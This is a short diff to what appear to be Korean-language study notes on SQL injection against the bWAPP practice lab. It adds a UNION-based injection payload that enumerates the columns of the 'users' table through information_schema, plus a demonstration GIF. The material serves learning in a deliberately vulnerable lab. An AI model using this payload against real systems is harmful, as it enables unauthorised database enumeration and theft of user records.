@@ -139,6 +139,11 @@ SQL 인젝션 결과 데이터베이스 서버에 존재하는 모든 데이터�
 
 [https://dev.mysql.com/doc/refman/8.0/en/information-schema-columns-table.html](https://dev.mysql.com/doc/refman/8.0/en/information-schema-columns-table.html)
 
+`' and 1 = 2 UNION select 1, TABLE_SCHEMA, TABLE_NAME, COLUMN_NAME, 5, 6, 7 from information_schema.columns where table_schema = 'bWAPP' and table_name = 'users' #`
+
+<center><img src = "https://user-images.githubusercontent.com/76420201/106383003-804c5680-6406-11eb-931d-273a10b9b4de.gif" width = "80%"></center>
+
+
 
 </details>
 
